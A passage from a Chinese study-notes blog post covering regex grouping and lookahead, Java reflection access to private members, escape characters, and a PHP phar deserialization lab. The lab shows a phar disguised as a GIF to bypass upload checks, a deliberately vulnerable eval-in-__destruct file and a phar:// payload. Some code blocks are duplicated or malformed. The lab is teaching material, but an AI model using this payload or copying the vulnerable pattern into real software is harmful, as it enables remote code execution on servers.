<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[A-Za-z0-9]/</span><br></pre></td></tr></table></figure>
<p>替换和分组<br>替换使用 | 字符来允许在两个或多个替换选项之间进行选择。例如，可以扩展章节标题正则表达式，以返回比章标题范围更广的匹配项。但是，这并不象您可能认为的那样简单。替换匹配 | 字符任一侧最大的表达式。<br>您可能认为，下面的表达式匹配出现在行首和行尾、后面跟一个或两个数字的 Chapter 或 Section：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter|Section [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
<p>很遗憾，上面的正则表达式要么匹配行首的单词 Chapter，要么匹配行尾的单词 Section 及跟在其后的任何数字。如果输入字符串是 Chapter 22，那么上面的表达式只匹配单词 Chapter。如果输入字符串是 Section 22，那么该表达式匹配 Section 22。<br>若要使正则表达式更易于控制，可以使用括号来限制替换的范围，即，确保它只应用于两个单词 Chapter 和 Section。但是，括号也用于创建子表达式，并可能捕获它们以供以后使用，这一点在有关反向引用的那一节讲述。通过在上面的正则表达式的适当位置添加括号，就可以使该正则表达式匹配 Chapter 1 或 Section 3。<br>下面的正则表达式使用括号来组合 Chapter 和 Section，以便表达式正确地起作用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
<p>尽管这些表达式正常工作，但 Chapter|Section 周围的括号还将捕获两个匹配字中的任一个供以后使用。由于在上面的表达式中只有一组括号，因此，只有一个被捕获的”子匹配项”。<br>在上面的示例中，您只需要使用括号来组合单词 Chapter 和 Section 之间的选择。若要防止匹配被保存以备将来使用，请在括号内正则表达式模式之前放置 ?:。下面的修改提供相同的能力而不保存子匹配项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(?:Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
<p>除 ?: 元字符外，两个其他非捕获元字符创建被称为”预测先行”匹配的某些内容。正向预测先行使用 ?= 指定，它匹配处于括号中匹配正则表达式模式的起始点的搜索字符串。反向预测先行使用 ?! 指定，它匹配处于与正则表达式模式不匹配的字符串的起始点的搜索字符串。<br>例如，假设您有一个文档，该文档包含指向 Windows 3.1、Windows 95、Windows 98 和 Windows NT 的引用。再进一步假设，您需要更新该文档，将指向 Windows 95、Windows 98 和 Windows NT 的所有引用更改为 Windows 2000。下面的正则表达式（这是一个正向预测先行的示例）匹配 Windows 95、Windows 98 和 Windows NT：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Windows(?=95 |98 |NT )/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正则表达式 	描述</span><br><span class="line">/\b([a-z]+) \1\b/gi 	一个单词连续出现的位置。</span><br><span class="line">/(\w+):\/\/([^/:]+)(:\d*)?([^<span class="comment"># ]*)/ 	将一个URL解析为协议、域、端口及相对路径。</span></span><br><span class="line">/^(?:Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/ 	定位章节的位置。</span><br><span class="line">/[-a-z]/ 	a至z共26个字母再加一个-号。</span><br><span class="line">/ter\b/ 	可匹配chapter，而不能匹配terminal。</span><br><span class="line">/\Bapt/ 	可匹配chapter，而不能匹配aptitude。</span><br><span class="line">/Windows(?=95 |98 |NT )/ 	可匹配Windows95或Windows98或WindowsNT，当找到一个匹配后，从Windows后面开始进行下一次的检索匹配。</span><br><span class="line">/^\s*$/ 	匹配空行。</span><br><span class="line">/\d&#123;2&#125;-\d&#123;5&#125;/ 	验证由两位数字、一个连字符再加 5 位数字组成的 ID 号。</span><br><span class="line">/&lt;\s*(\S+)(\s[^&gt;]*)?&gt;[\s\S]*&lt;\s*\/\1\s*&gt;/ 	匹配 HTML 标记。</span><br></pre></td></tr></table></figure>
<p>五．私有属性绕过<br>java的反射可以绕过访问权限，访问到类的私有方法和成员。可能这点会引起安全性的讨论。反射的使用帮助解决很多复杂的问题，其运行时的类型检查，动态调用，代理的实现等，反射为我们写程序带来了很大的灵活性，很多功能都是基于反射。<br>    利用反射还可以访问内部类、匿名内部类的私有属性。<br>    用java自带的java -private 类名 反编译命令可以查看类的完整定义。（参考think in java）<br>下面举例子说明。首先定义一个接口 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Java代码  public interface Ref &#123;   </span><br><span class="line">    public void f();   </span><br><span class="line">&#125; public interface Ref &#123;</span><br><span class="line"> public void f();</span><br><span class="line">&#125;</span><br><span class="line">接口的实现类 </span><br><span class="line">Java代码  public class RefImpl implements Ref &#123;   </span><br><span class="line">        //实现接口方法   </span><br><span class="line">    public void <span class="function"><span class="title">f</span></span>() &#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;public method f()&quot;</span>);   </span><br><span class="line">    &#125;   </span><br><span class="line">       </span><br><span class="line">    void g(String args)&#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;package method g():&quot;</span> + args);   </span><br><span class="line">    &#125;   </span><br><span class="line">       </span><br><span class="line">    private void <span class="function"><span class="title">w</span></span>()&#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;private method w()&quot;</span>);   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125; public class RefImpl implements Ref &#123;</span><br><span class="line">        //实现接口方法</span><br><span class="line"> public void <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;public method f()&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void g(String args)&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;package method g():&quot;</span> + args);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> private void <span class="function"><span class="title">w</span></span>()&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;private method w()&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">测试类 </span><br><span class="line">Java代码  public class TestRef &#123;   </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) &#123;   </span><br><span class="line">        Ref ref = new RefImpl();   </span><br><span class="line">        System.out.println(ref.getClass().getSimpleName()); //RefImpl类型   </span><br><span class="line">        ref.f(); //调用接口方法   //      ref.g();  //向上转型后实现类添加的方法不能调用   </span><br><span class="line">        <span class="keyword">if</span>(ref instanceof RefImpl)&#123;   </span><br><span class="line">            RefImpl ref1 = (RefImpl)ref;  //类型识别后转型   </span><br><span class="line">            ref1.g(<span class="string">&quot;zhouyang&quot;</span>);   //          ref1.w(); //私有方法不能访问   </span><br><span class="line">        &#125;   </span><br><span class="line">           </span><br><span class="line">        //通过反射调用方法   </span><br><span class="line">        try &#123;   </span><br><span class="line">            Ref ref2 = new RefImpl();   </span><br><span class="line">            Method m = ref2.getClass().getDeclaredMethod(<span class="string">&quot;f&quot;</span>);   </span><br><span class="line">            Method m1 = ref2.getClass().getDeclaredMethod(<span class="string">&quot;g&quot;</span>, String.class);//有参的方法   </span><br><span class="line">            Method m2 = ref2.getClass().getDeclaredMethod(<span class="string">&quot;w&quot;</span>);   </span><br><span class="line">            System.out.println(<span class="string">&quot;==============&quot;</span>);   </span><br><span class="line">            m.invoke(ref);  //调用方法f()   </span><br><span class="line">            m1.invoke(ref, <span class="string">&quot;yangzhou&quot;</span>);   </span><br><span class="line">               </span><br><span class="line">            m2.setAccessible(<span class="literal">true</span>);///调用private方法的关键一句话   </span><br><span class="line">            m2.invoke(ref);   </span><br><span class="line">        &#125; catch (Exception e) &#123;   </span><br><span class="line">            e.printStackTrace();   </span><br><span class="line">        &#125;    </span><br><span class="line">           </span><br><span class="line">        //java的javap反编译能够查看类的信息，-private 开关能够打开所有信息   </span><br><span class="line">        //javap -private 类名      类必须是编译成.calss 文件   </span><br><span class="line">           </span><br><span class="line">        //利用反射访问私有成员，改变私有成员值，但是final域可以访问不可改变   </span><br><span class="line">        PrivateField pf = new PrivateField();   //      ps.ss; //私有成员不能访问   </span><br><span class="line">        //打印原来的成员值   </span><br><span class="line">        pf.print();   </span><br><span class="line">        try &#123;   </span><br><span class="line">            //反射访问和改变原来值   </span><br><span class="line">            Field[] f = pf.getClass().getDeclaredFields();   </span><br><span class="line">            <span class="keyword">for</span>(int   i=0;i&lt;f.length;i++)&#123;   </span><br><span class="line">                f[i].setAccessible(<span class="literal">true</span>);   </span><br><span class="line">                System.out.println(f[i].getType());//打印字段类型      </span><br><span class="line">                System.out.println(f[i].get(pf)); //打印值   </span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&quot;ss&quot;</span>.equals(f[i].getName()))&#123;   </span><br><span class="line">                    f[i].<span class="built_in">set</span>(pf, <span class="string">&quot;hehe&quot;</span>); //修改成员值   </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;   </span><br><span class="line">                    f[i].setInt(pf, 55);   </span><br><span class="line">                &#125;   </span><br><span class="line">                   </span><br><span class="line">            &#125;   </span><br><span class="line">            //重新打印修改后的成员值，final域值不变   </span><br><span class="line">            pf.print();   </span><br><span class="line">        &#125; catch (Exception e) &#123;   </span><br><span class="line">            e.printStackTrace();   </span><br><span class="line">        &#125;    </span><br><span class="line">        /*打印输出的结果  </span><br><span class="line">         *  RefImpl  </span><br><span class="line">            public method f()</span><br></pre></td></tr></table></figure>
<p>六．字符逃逸<br>1.无法直接打出来的字符<br>2.例如控制字符，特殊字符<br>用“ \ ”开头后加另一个字符=逃逸字符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\b——回退一格</span><br></pre></td></tr></table></figure>
<p>1.不是删除</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">	System.out.println(<span class="string">&quot;abc\b&quot;</span>);</span><br><span class="line">```eclipse输出abc </span><br><span class="line">workspace输出abc </span><br><span class="line">System.out.println(<span class="string">&quot;abc\bd&quot;</span>);</span><br><span class="line">eclipse输出abcd</span><br><span class="line">workspace输出abd</span><br><span class="line">```bash</span><br><span class="line">\t——到下一个表格位</span><br><span class="line">System.out.println(<span class="string">&quot;abc\t123&quot;</span>);</span><br><span class="line">		System.out.println(<span class="string">&quot;a\t123&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>输出：<br>abc ? ? ? ?123<br>a ? ? ? ? ? ?123</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n,\r——回车换行</span><br></pre></td></tr></table></figure>
<p>七．PHar反序列化<br>关于流包装<br>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如data://，zlib://或php://。<br>phar://也是流包装的一种</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phar原理</span><br><span class="line">a stub</span><br><span class="line">可以理解为一个标志，格式为xxx&lt;?php xxx;__HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</span><br></pre></td></tr></table></figure>
<p>phar原理<br>a stub<br>可以理解为一个标志，格式为xxx<?php xxx;__HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>demo<br>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作<br>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。<br>phar.php:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>); //后缀名必须为phar</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); //设置stub</span><br><span class="line">    <span class="variable">$o</span> = new TestObject();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); //将自定义的meta-data存入manifest</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>访问后,会生成一个phar.phar<br>用winhex打开<br>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化<br>phar_fan.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject&#123;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span> -&gt; data;   // TODO: Implement __destruct() method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hu3sky</span><br></pre></td></tr></table></figure>
<p>将phar伪造成其他格式的文件<br>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = new Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   //设置stub，增加gif文件头</span><br><span class="line">    <span class="variable">$phar</span> -&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);  //添加要压缩的文件</span><br><span class="line">    <span class="variable">$object</span> = new TestObject();</span><br><span class="line">    <span class="variable">$object</span> -&gt; data = <span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$object</span>);  //将自定义meta-data存入manifest</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>采用这种方法可以绕过很大一部分上传检测。<br>利用条件<br>phar文件要能够上传到服务器端。<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>漏洞验证<br>环境准备<br>upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br>upload_file.html 文件上传表单<br>file_un.php 存在file_exists()，并且存在__destruct()<br>文件内容<br>upload_file.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>upload_file.html</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>file_un.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
<p>实现过程<br>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码<br>构造代码<br>eval.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = new AnyClass();</span><br><span class="line"><span class="variable">$object</span> -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
<p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif<br>然后利用file_un.php。<br>payload:filename=phar://upload_file/phar.gif</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/10/08/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckg0haxoj0000lgv3fejddaxj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/">90道MISC部分</a>
          </li>
        
          <li>
            <a href="/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/">MISC解题思路</a>
          </li>
        
          <li>
            <a href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/">海啸杯wp</a>
          </li>
        
          <li>
            <a href="/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/">漏洞</a>
          </li>
        
          <li>
            <a href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/">SQL注入</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>